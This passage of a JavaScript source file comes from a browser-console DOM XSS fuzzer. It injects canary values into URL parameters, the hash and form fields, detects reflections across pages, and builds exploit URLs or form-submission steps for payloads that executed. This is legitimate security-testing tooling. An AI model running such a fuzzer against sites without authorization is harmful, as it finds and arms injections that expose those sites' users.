          const paramMatch = c.source.match(/\?(\w+)=/);
          if (paramMatch) {
            const u = new URL(location.origin + location.pathname);
            for (const [k, val] of savedOriginalParams) u.searchParams.set(k, val);
            u.searchParams.set(paramMatch[1], cleanPayload);
            exploitUrl = u.toString();
          }
        }

        ns.log.info(`%c  Payload: %c${cleanPayload}`, 'color:#ccc', 'color:#00ff00;font-weight:bold;font-family:monospace;font-size:13px');
        ns.log.info(`%c  Context: %c${c.context}%c  Source: %c${c.source || '?'}`, 'color:#888', 'color:#ff00ff', 'color:#888', 'color:#00ddff');
        if (c.type === 'stored-xss-post') {
          ns.log.info(`%c  Type: %cSTORED XSS`, 'color:#888', 'color:#ff4444;font-weight:bold');
          ns.log.info(`%c  Field: %c${c.inputName || '?'}%c  Form: %c${c.formAction || '?'}`, 'color:#888', 'color:#00ddff;font-weight:bold', 'color:#888', 'color:#888');
          ns.log.info(`%c  \u2192 Set "${c.inputName}" to: %c${cleanPayload}%c then submit the form`, 'color:#ffaa00', 'color:#00ff00;font-weight:bold', 'color:#ffaa00');
        } else if (exploitUrl) {
          ns.log.info(`%c  URL: %c${exploitUrl}`, 'color:#888', 'color:#4488ff;font-family:monospace;font-size:12px');
        }
        if (c.desc) ns.log.info(`%c  ${c.desc}${c.bypass ? ` (bypass: ${c.bypass})` : ''}`, 'color:#666');
        ns.log.info('');
      }
      ns.log.info('%cdomxss.fuzz.results()%c for export  |  %cdomxss.unhighlight()%c to clear', 'color:#ff00ff;font-weight:bold', 'color:#ccc', 'color:#888;font-style:italic', 'color:#ccc');
    } else if (reflections.length > 0) {
      ns.log.info(`%c\u26A0\uFE0F ${reflections.length} reflejo(s) encontrados pero ${totalAttempts} payloads no se ejecutaron`, 'font-size:13px;font-weight:bold;color:#ffaa00');
      ns.log.info('');
      ns.log.info('%c\uD83D\uDCA1 Posibles razones:', 'font-weight:bold;color:#00aaff');
      ns.log.info('   - CSP (Content-Security-Policy) bloquea ejecuci\u00f3n inline');
      ns.log.info('   - Sanitizaci\u00f3n del lado del servidor que no se detecta client-side');
      ns.log.info('   - El payload necesita interacci\u00f3n del usuario (click, hover)');
      ns.log.info('   - El reflejo es en response headers, no en el body');
      ns.log.info('');
      ns.log.info('%c\uD83D\uDCCB Acciones:', 'font-weight:bold');
      ns.log.info('   1. Revisar CSP: %cdocument.querySelector("meta[http-equiv=Content-Security-Policy]")?.content', 'color:#888;font-family:monospace');
      ns.log.info('   2. Ejecuta %cdomxss.fuzz.nav()%c para testear via URL con navegaci\u00f3n real', 'color:#ff00ff;font-weight:bold', 'color:#ccc');
      ns.log.info('   3. Probar manualmente con %cdomxss.probe()%c y ajustar payloads', 'color:#ff6600;font-weight:bold', 'color:#ccc');
      ns.log.info('   4. Usar %cdomxss.fuzz({ autoSubmitForms: true })%c para submit agresivo', 'color:#ff00ff;font-weight:bold', 'color:#ccc');
    } else {
      ns.log.info('%c\u2705 No se encontraron reflejos \u2014 superficie XSS limpia', 'font-size:13px;color:green;font-weight:bold');
    }

    // Guardar estado
    try {
      sessionStorage.setItem('__domxss_canary', JSON.stringify(masterCanary));
      sessionStorage.setItem('__domxss_fuzz_results', JSON.stringify(fuzzResults));
    } catch (e) { ns.log.debug(e.message); }
    window.__domxss_fuzzResults = fuzzResults;

    // Restaurar inputs originales (reinjectar canary base para no dejar payloads activos)
    for (const v of vectors) {
      if (v.type === 'input' && v.element) {
        try {
          if (v.element.contentEditable === 'true') v.element.textContent = '';
          else v.element.value = '';
        } catch (e) { ns.log.debug(e.message); }
      }
    }

    return fuzzResults;
  }

  /**
   * Cross-page fuzz check: busca canary/payloads de un fuzz anterior en la pagina actual
   */
  function fuzzCheck() {
    console.clear();
    ns.log.info('%c\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557', 'color:#ff00ff;font-weight:bold');
    ns.log.info('%c\u2551      \uD83E\uDD16 FUZZ CHECK \u2014 Verificaci\u00f3n cross-page             \u2551', 'color:#ff00ff;font-weight:bold');
    ns.log.info('%c\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d', 'color:#ff00ff;font-weight:bold');
    ns.log.info(`\uD83D\uDCCD ${location.href}\n`);

    let canary = window.__domxss_lastCanary;
    if (!canary) {
      try {
        const stored = sessionStorage.getItem('__domxss_canary');
        if (stored) canary = JSON.parse(stored);
      } catch (e) { ns.log.debug(e.message); }
    }

    if (!canary) {
      ns.log.info('%c\u26A0\uFE0F No hay canary pendiente. Ejecuta domxss.fuzz() primero.', 'color:orange');
      return;
    }

    ns.log.info(`\uD83D\uDD11 Canary: %c${canary.base}%c (de sesi\u00f3n anterior)`, 'color:#ff6600;font-weight:bold', 'color:#ccc');

    // Buscar reflejos
    const reflections = findReflections(canary);
    const pageHTML = document.documentElement.outerHTML;
    const rawCount = (pageHTML.match(new RegExp(canary.base, 'g')) || []).length;

    ns.log.info(`\uD83D\uDCC4 ${rawCount} ocurrencia(s) en HTML raw`);

    if (reflections.length > 0) {
      ns.log.info(`\n%c\uD83D\uDD25 \u00a1Canary encontrado en esta p\u00e1gina! ${reflections.length} reflejo(s)`, 'color:#ff0000;font-weight:bold;font-size:14px');
      printReflections(reflections, canary, 'Cross-page fuzz');

      ns.log.info('\n%c\uD83D\uDCA1 Ejecuta %cdomxss.fuzz()%c aqu\u00ed para probar payloads en esta p\u00e1gina', 'color:#ccc', 'color:#ff00ff;font-weight:bold', 'color:#ccc');
    } else if (rawCount > 0) {
      ns.log.info(`\n%c\u26A0\uFE0F Canary en HTML raw pero no en DOM accesible`, 'color:#ffaa00;font-weight:bold');
      ns.log.info('   Puede estar en atributos encoded, headers, o scripts.');

      let from = 0, n = 0;
      while (from < pageHTML.length && n < 5) {
        const idx = pageHTML.indexOf(canary.base, from);
        if (idx === -1) break;
        n++;
        const snippet = pageHTML.substring(Math.max(0, idx - 60), Math.min(pageHTML.length, idx + canary.full.length + 60));
        ns.log.info(`\n   #${n}: %c${truncate(snippet, 180)}`, 'font-family:monospace;color:#ccc;background:#1a1a1a;padding:4px;font-size:11px');
        from = idx + 1;
      }
    } else {
      ns.log.info('\n%c\u2705 Canary no encontrado en esta p\u00e1gina', 'color:green');
      ns.log.info('   Sigue navegando y ejecuta domxss.fuzz.check() en cada p\u00e1gina.');
    }
  }

  /**
   * Navega con canary inyectado en URL params para testear DOM XSS via location.search/hash.
   * Tests one param at a time to avoid breaking pages that require specific param values.
   * Uses sessionStorage queue so after navigation/reload, the next param is tested automatically.
   */
  function fuzzNav() {
    const QUEUE_KEY = '__domxss_fuzz_nav_queue';
    const RESULTS_KEY = '__domxss_fuzz_nav_results';

    // Check if there's an existing queue to continue
    let queue;
    try { queue = JSON.parse(sessionStorage.getItem(QUEUE_KEY)); } catch (e) { ns.log.debug(e.message); }

    if (!queue || !queue.params || queue.params.length === 0) {
      // First call: build the queue from scratch
      const baseUrl = new URL(location.href);
      const existingParams = [...baseUrl.searchParams.entries()];
      const existingKeys = new Set(existingParams.map(([k]) => k));
      const discoveredParams = discoverParamsFromSource(existingKeys);

      // Build param list: each entry has {key, originalValue, isDiscovered}
      const paramList = [];
      for (const [key, val] of existingParams) {
        paramList.push({ key, originalValue: val, isDiscovered: false });
      }
      for (const key of discoveredParams) {
        paramList.push({ key, originalValue: '', isDiscovered: true });
      }
      // Always include __xss_probe
      paramList.push({ key: '__xss_probe', originalValue: '', isDiscovered: false });
      // Hash as a special entry
      paramList.push({ key: '__hash__', originalValue: baseUrl.hash, isDiscovered: false });

      // Save original base URL (without canary modifications)
      const cleanUrl = new URL(location.href);
      cleanUrl.hash = '';

      queue = {
        baseUrl: cleanUrl.toString(),
        originalHash: baseUrl.hash,
        originalParams: existingParams, // [[key, value], ...]
        params: paramList,
        tested: 0,
        total: paramList.length,
      };

      // Clear any previous results
      try { sessionStorage.removeItem(RESULTS_KEY); } catch (e) { ns.log.debug(e.message); }

      ns.log.info('%c\uD83D\uDE80 FUZZ NAV \u2014 Testing params one at a time', 'font-weight:bold;color:#ff00ff;font-size:13px');
      ns.log.info(`   Total params to test: ${queue.total}`);
      ns.log.info('   Params:');
      for (const p of paramList) {
        const tag = p.key === '__hash__' ? '#hash' : `?${p.key}`;
        const disc = p.isDiscovered ? ' (discovered)' : '';
        ns.log.info(`   \u2022 ${tag}${disc}`);
      }
      ns.log.info('');
    }

    // Pop the next param to test
    const nextParam = queue.params.shift();
    queue.tested++;

    if (!nextParam) {
      // All done
      fuzzNav._printSummary();
      return;
    }

    const canary = generateCanary();
    const url = new URL(queue.baseUrl);

    // Restore all original params first
    for (const [key, val] of queue.originalParams) {
      url.searchParams.set(key, val);
    }

    if (nextParam.key === '__hash__') {
      // Testing hash only — keep all params at original values
      url.hash = canary.full;
    } else {
      // Set only this param to canary, keep everything else original
      url.searchParams.set(nextParam.key, canary.full);
    }

    // Save queue and canary for post-navigation
    try {
      sessionStorage.setItem(QUEUE_KEY, JSON.stringify(queue));
      sessionStorage.setItem('__domxss_canary', JSON.stringify(canary));
      sessionStorage.setItem('__domxss_fuzz_nav', 'true');
      sessionStorage.setItem('__domxss_fuzz_nav_param', nextParam.key);
    } catch (e) { ns.log.debug(e.message); }

    const paramLabel = nextParam.key === '__hash__' ? '#hash' : `?${nextParam.key}`;

    ns.log.info(`%c\uD83D\uDE80 FUZZ NAV [${queue.tested}/${queue.total}] \u2014 Testing: ${paramLabel}`, 'font-weight:bold;color:#ff00ff;font-size:13px');
    ns.log.info(`\uD83D\uDD11 Canary: %c${canary.base}`, 'color:#ff6600;font-weight:bold');
    ns.log.info(`\uD83D\uDD17 URL: %c${truncate(url.toString(), 150)}`, 'color:#4488ff');
    if (nextParam.isDiscovered) {
      ns.log.info(`   %cParam "${nextParam.key}" was discovered from source code`, 'color:#ff6600');
    }
    ns.log.info('');
    ns.log.info('%c   After reload, the scanner will auto-detect canary reflections.', 'color:#ffaa00');
    ns.log.info('%c   Run %cdomxss.fuzz.nav()%c again to test the next param, or %cdomxss.fuzz.nav.next()%c', 'color:#ccc', 'color:#ff00ff;font-weight:bold', 'color:#ccc', 'color:#ff00ff;font-weight:bold', 'color:#ccc');

    // Navigate
    setTimeout(() => { location.href = url.toString(); }, CONFIG.delays.postRedirect);
  }

  /** Advance to next param in queue (alias for fuzzNav) */
  fuzzNav.next = function () {
    fuzzNav();
  };

  /** Print summary of all fuzzNav results */
  fuzzNav._printSummary = function () {
    const RESULTS_KEY = '__domxss_fuzz_nav_results';
    let results;
    try { results = JSON.parse(sessionStorage.getItem(RESULTS_KEY)); } catch (e) { ns.log.debug(e.message); }

    ns.log.info('%c\uD83C\uDFC1 FUZZ NAV \u2014 All params tested!', 'font-weight:bold;color:#00ff00;font-size:13px');
    const withReflections = (results || []).filter(r => r.reflectionCount > 0);
    if (withReflections.length > 0) {
      ns.log.info(`   %c${withReflections.length} param(s) had reflections:`, 'color:#ff00ff;font-weight:bold');
      for (const r of withReflections) {
        ns.log.info(`   \u2022 ${r.param}: ${r.reflectionCount} reflection(s)`);
      }
    } else {
      ns.log.info('   No reflections found in any param.');
    }
    ns.log.info('%c   Run %cdomxss.fuzz.check()%c for full analysis.', 'color:#ccc', 'color:#ff00ff;font-weight:bold', 'color:#ccc');

    // Clean up queue
    try {
      sessionStorage.removeItem('__domxss_fuzz_nav_queue');
      sessionStorage.removeItem('__domxss_fuzz_nav_param');
    } catch (e) { ns.log.debug(e.message); }
  };

  /** Reset the fuzzNav queue (start over) */
  fuzzNav.reset = function () {
    try {
      sessionStorage.removeItem('__domxss_fuzz_nav_queue');
      sessionStorage.removeItem('__domxss_fuzz_nav_results');
      sessionStorage.removeItem('__domxss_fuzz_nav_param');
    } catch (e) { ns.log.debug(e.message); }
    ns.log.info('%c\u267B\uFE0F FUZZ NAV queue reset. Run domxss.fuzz.nav() to start fresh.', 'color:#00aaff;font-weight:bold');
  };

  function fuzzResultsExport() {
    const results = window.__domxss_fuzzResults;
    if (!results) {
      ns.log.info('%c\u26A0\uFE0F No hay resultados de fuzz. Ejecuta domxss.fuzz() primero.', 'color:orange');
      return null;
    }

    const json = JSON.stringify(results, null, 2);
    try {
      navigator.clipboard.writeText(json);
      ns.log.info('%c\u2705 Resultados de fuzz copiados al clipboard', 'color:green;font-weight:bold');
    } catch {
      ns.log.info(json);
    }
    return results;
  }

  ns.fuzzer = {
    generateEncodingBypasses, resolveRealPayload, isPayloadReflected,
    getFillerValue, getCanaryValue, selectVerifyPayloads,
    discoverParamsFromSource, injectAndWait,
    autoFuzz, fuzzCheck, fuzzNav, fuzzResultsExport,
  };
})();
